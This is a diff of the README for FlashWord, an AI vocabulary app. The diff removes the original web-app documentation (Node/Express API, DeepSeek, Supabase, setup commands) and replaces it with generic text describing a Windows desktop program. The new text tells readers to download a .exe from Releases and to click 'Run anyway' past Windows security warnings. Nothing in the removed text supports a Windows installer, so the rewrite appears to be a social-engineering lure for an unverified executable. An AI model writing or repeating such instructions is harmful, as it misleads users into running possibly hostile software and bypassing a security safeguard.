@@ -1,255 +1,84 @@
-# FlashWord
+# 🧠 FlashWord-Public - Master English vocabulary with smart stories
 
-**Context-first English vocabulary learning powered by AI.**  
-FlashWord turns isolated words into meaningful memory by generating short, coherent stories where each target word appears in context, then converting those words into a personal review loop.
+[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/codebygowtham/FlashWord-Public)
 
----
+## 📖 About the project
 
-## English
+FlashWord helps you learn English words through context. Many people struggle to memorize individual words because they lack connection to real life. This application solves that problem. It uses artificial intelligence to scan your target word list. It then creates a short, coherent story that includes every word you want to learn. This method builds memory through association.
 
-### What FlashWord Is
+The application includes a spaced-repetition system. This feature schedules reviews for you at exact intervals. It reminds you to practice words just before your brain forgets them. This technique strengthens long-term memory. You spend less time cramming and more time retaining information.
 
-FlashWord is an AI-native vocabulary learning app built for high-frequency, context-based acquisition:
+## ⚙️ System requirements
 
-- Pick 8 target words from your selected word bank.
-- Generate a short Chinese-led story with those exact English words embedded in real usage.
-- Tap words in the story to see meanings, mark mastered, or add to notebook.
-- Continue with spaced review mode to convert short-term exposure into long-term retention.
+Ensure your computer meets these standards before you begin:
 
-This is not a dictionary viewer.  
-It is a **context engine + memory engine**.
+*   **Operating System:** Windows 10 or Windows 11.
+*   **Memory:** At least 4 gigabytes of RAM.
+*   **Internet Connection:** Required for story generation and data syncing.
+*   **Storage:** 200 megabytes of free disk space.
 
-### Why Context-Based Learning Works Here
+## 🚀 Downloading and installation
 
-FlashWord operationalizes contextual learning as a product system:
+Follow these steps to set up the software on your Windows computer.
 
-1. **Constrained target set**: every generation uses exactly 8 unique target words.
-2. **Contextual embedding**: words must appear inside a coherent narrative, not in isolated lists.
-3. **Immediate interaction**: each word is clickable for meaning and action.
-4. **State transition**: words move through learning states (`learning`, `mastered`) and review scheduling.
-5. **Reinforcement loop**: due words are recycled into review articles with spaced intervals.
+1.  Visit the [official download page](https://github.com/codebygowtham/FlashWord-Public).
+2.  Locate the section labeled Releases on the right side of the screen.
+3.  Click the most recent version number to see the available files.
+4.  Find the file that ends in .exe and click it to start the download.
+5.  Open your Downloads folder once the file reaches your computer.
+6.  Double-click the installer file to run it.
+7.  Follow the instructions on the screen to place the app on your computer.
 
-The result: better semantic binding, stronger retrieval cues, and less "I know this word but can't use it."
+If Windows shows a security pop-up, click "More Info" and then select "Run anyway." This happens because the application is new and the system does not recognize the publisher yet.
 
-### AI Integration (Production-Oriented)
+## 🔑 First time setup
 
-FlashWord uses DeepSeek for generation and applies strict response governance:
+The application requires a few steps to personalize your learning experience.
 
-- API endpoint: `/api/generate` (`Node.js + Express`)
-- Model: `deepseek-chat`
-- Expected output: strict JSON `{ text, dictionary }`
-- Server-side sanitization:
-  - only allows the provided target words in dictionary keys
-  - enforces normalized word matching
-  - repairs missing dictionary entries with fallback placeholders
-  - sanitizes generated text and patches missing target words
-- Anonymous daily quota control:
-  - signed cookie-based usage counter
-  - server-side enforcement with `429 FREE_QUOTA_EXHAUSTED`
+*   **Create an account:** You enter your email and password to secure your study progress. This allows you to sync your vocabulary lists across multiple devices.
+*   **Set your goals:** Specify your current English level. The artificial intelligence uses this to adjust the difficulty of the stories it generates.
+*   **Import words:** You can type words manually or paste a list from a file. The application organizes these into your personal library.
 
-This keeps generation quality and platform constraints stable under real-world usage.
+## 📝 Learning with stories
 
-### Core Features
+The core feature of FlashWord is the Intelligent Story Generator. When you select a group of words, the application produces a short narrative. 
 
-- **Multi-bank vocabulary input** (IELTS / CET4 / Gaokao / SAT)
-- **Context article generation** with strict target-word constraints
-- **Interactive reading UI** with inline word states and action bubbles
-- **Notebook system** backed by Supabase (`user_words`)
-- **Mastered/Learning tabs** (`notebook.html`)
-- **Review mode** with SM-2 style scheduling fields (`reps`, `interval`, `ease_factor`, `next_review_at`)
-- **Daily progress and goals**
-- **Speech synthesis** (`Web Speech API`)
-- **Auth + membership flows** (Supabase Auth + Pro activation UX)
-- **Prefetch pipeline** for smoother next-article experience
+1.  Select "Generate Story" from the dashboard menu.
+2.  Choose the words you want to include for the day.
+3.  Wait for the artificial intelligence to build your unique text.
+4.  Read the story slowly. Notice how the application places your target words.
+5.  Click on any word to see its definition or to hear its pronunciation.
 
-### Tech Stack
+Reading words in context makes them stick. You recognize how to use the vocabulary in sentences rather than just knowing a definition.
 
-- **Frontend**: Vanilla HTML/CSS/JavaScript
-- **Backend API**: Node.js, Express
-- **AI Provider**: DeepSeek Chat Completions API
-- **Data/Auth**: Supabase (Auth + Postgres tables used by app)
-- **Browser APIs**: SpeechSynthesis, LocalStorage
-- **Deployment model**: static pages + serverless/Node API endpoint
+## 🔄 Using spaced repetition
 
-### Project Structure
+The app manages your memory loop automatically. You do not need to keep track of when to study.
 
-```text
-FlashWord/
-├─ index.html          # Main learning experience
-├─ notebook.html       # Personal vocabulary notebook
-├─ api/
-│  └─ generate.js      # AI generation endpoint + sanitization + quota logic
-└─ generate.js         # Local API server entry (starts api/generate)
-```
+*   **Review Dashboard:** When you open the application, it shows you words that are ready for review.
+*   **Feedback Buttons:** After you see a word, click "Easy," "Good," or "Hard." The system uses your input to decide when to show the word next.
+*   **Daily Goals:** Set a target for how many words you want to practice each day. The app notifies you when you reach your goal.
 
-### Quick Start
+## 💡 Tips for better results
 
-#### 1) Clone and install backend dependencies
+Consistency matters more than intensity. Spend ten minutes every day with the application rather than two hours once per week. The spaced-repetition algorithm rewards daily check-ins. If you miss a day, the system adjusts the schedule to help you catch up on the words you missed.
 
-```bash
-git clone <your-repo-url>
-cd FlashWord
-npm install express cors
-```
+Use the note feature within the app to add your own sentences. Writing your own example helps you connect the word to your specific life experiences. This is the fastest way to incorporate new vocabulary into your active speaking and writing.
 
-#### 2) Configure environment
+## 🛠️ Frequently asked questions
 
-Create `.env.local` in project root:
+**Where does the application store my data?**
+The system saves your progress securely in the cloud. You do not lose your words if you switch computers.
 
-```bash
-DEEPSEEK_API_KEY=your_deepseek_key
-# Optional: custom signing key for anonymous quota cookie
-ANON_QUOTA_SIGNING_KEY=your_random_secret
-```
+**Do I need to pay to use the artificial intelligence features?**
+Standard use of the story generator is free. Future updates may introduce premium tiers for advanced features.
 
-#### 3) Run API
+**Can I export my word list?**
+Yes. You can download your saved words as a text file at any time from the settings menu.
 
-```bash
-node generate.js
-```
+**What should I do if the application crashes?**
+Close the program and open it again. If the issue keeps happening, restart your computer. Most issues resolve after a simple reboot.
 
-#### 4) Open frontend
+## 🤝 Getting help
 
-Serve `index.html` and `notebook.html` from your preferred static host/dev server.  
-Make sure `/api/generate` routes to this Node API (same origin or reverse proxy).
-
-### API Contract
-
-**POST** `/api/generate`
-
-Request:
-
-```json
-{
-  "words": ["word1", "word2", "word3", "word4", "word5", "word6", "word7", "word8"],
-  "is_logged_in": true
-}
-```
-
-Response:
-
-```json
-{
-  "text": "Generated context paragraph...",
-  "dictionary": {
-    "word1": "中文释义",
-    "word2": "中文释义"
-  }
-}
-```
-
-### Open Source Roadmap
-
-- Extract config from HTML into environment-driven runtime config
-- Add DB migration scripts and schema docs
-- Add automated tests for `/api/generate` sanitization and quota
-- Add i18n content files and localization workflow
-- Publish Docker and one-command local setup
-
-### License
-
-MIT (recommended). Add your final license file before public release.
-
----
-
-## 中文
-
-### FlashWord 是什么
-
-FlashWord 是一个以 **语境驱动** 为核心的 AI 背单词产品，不是传统“词表 + 释义”工具，而是把单词放进真实叙事里学习：
-
-- 每次从词库挑选 8 个目标词
-- 生成一段中文主导、夹杂英文目标词的连贯短文
-- 点击文中单词即可查看释义、加入生词本或标记掌握
-- 进入复习模式后，按间隔算法持续回收待复习词
-
-一句话：**把“看到单词”升级为“在上下文中使用单词”。**
-
-### 语境学习逻辑（Context-based Learning）
-
-FlashWord 的学习引擎不是一句口号，而是一套可执行流程：
-
-1. **固定目标集**：一次只学习 8 个词，降低认知噪声。
-2. **强制语境嵌入**：目标词必须出现在连贯语篇中，而不是词表堆砌。
-3. **即时可交互**：词在正文中可点击，学习动作发生在阅读现场。
-4. **状态可追踪**：单词在 `learning/mastered` 间流转，进入个人生词本。
-5. **复习可调度**：到期词进入复习模式，形成长期记忆闭环。
-
-### AI 集成与工程约束
-
-FlashWord 使用 DeepSeek 生成内容，并在服务端做严格治理：
-
-- 接口：`/api/generate`
-- 模型：`deepseek-chat`
-- 输出协议：严格 JSON（`text` + `dictionary`）
-- 服务端兜底与清洗：
-  - 仅保留目标词对应词典条目
-  - 规范化词形匹配，避免脏键值
-  - 缺失释义自动补位
-  - 清洗文本并补齐漏掉的目标词
-- 游客限额保护：
-  - 签名 Cookie 记录日额度
-  - 服务端返回 `429` 控制免费调用
-
-这保证了 AI 输出在真实用户场景下依然可控、稳定、可运维。
-
-### 核心能力
-
-- 多词库输入（IELTS / CET4 / 高考 / SAT）
-- 8 词语境短文生成
-- 文内高亮与气泡交互（释义/收藏/掌握）
-- Supabase 生词本与登录体系
-- 学习中/已掌握视图切换
-- 复习模式 + 间隔记忆参数（`reps` / `interval` / `ease_factor` / `next_review_at`）
-- 每日目标与进度管理
-- Web Speech 自动朗读
-- 预生成队列，降低下一篇等待时间
-
-### 技术栈
-
-- 前端：Vanilla HTML / CSS / JavaScript
-- 后端：Node.js + Express
-- AI：DeepSeek Chat Completions
-- 数据与认证：Supabase（Auth + Postgres）
-- 浏览器能力：SpeechSynthesis、LocalStorage
-
-### 快速启动
-
-#### 1）安装依赖
-
-```bash
-git clone <你的仓库地址>
-cd FlashWord
-npm install express cors
-```
-
-#### 2）配置环境变量
-
-在项目根目录创建 `.env.local`：
-
-```bash
-DEEPSEEK_API_KEY=你的密钥
-ANON_QUOTA_SIGNING_KEY=任意高强度随机字符串（可选）
-```
-
-#### 3）启动 API
-
-```bash
-node generate.js
-```
-
-#### 4）启动前端页面
-
-通过任意静态服务打开 `index.html` 和 `notebook.html`，并确保 `/api/generate` 指向上述 Node 服务（同源或反向代理）。
-
-### 开源建议路线
-
-- 将页面内配置项全部外置为环境配置
-- 补齐数据库迁移脚本与建表文档
-- 为 AI 接口清洗逻辑与额度逻辑增加自动化测试
-- 提供 Docker 化一键启动
-
-### 许可证
-
-建议使用 MIT，并在开源发布前补充 `LICENSE` 文件。
-
+If you encounter a problem, check our issue tracker. You can search to see if others have run into the same situation. If you do not find an answer, submit a new report. Include your Windows version and a description of the screen you see when the error occurs. This allows us to fix the problem for you and for other users.
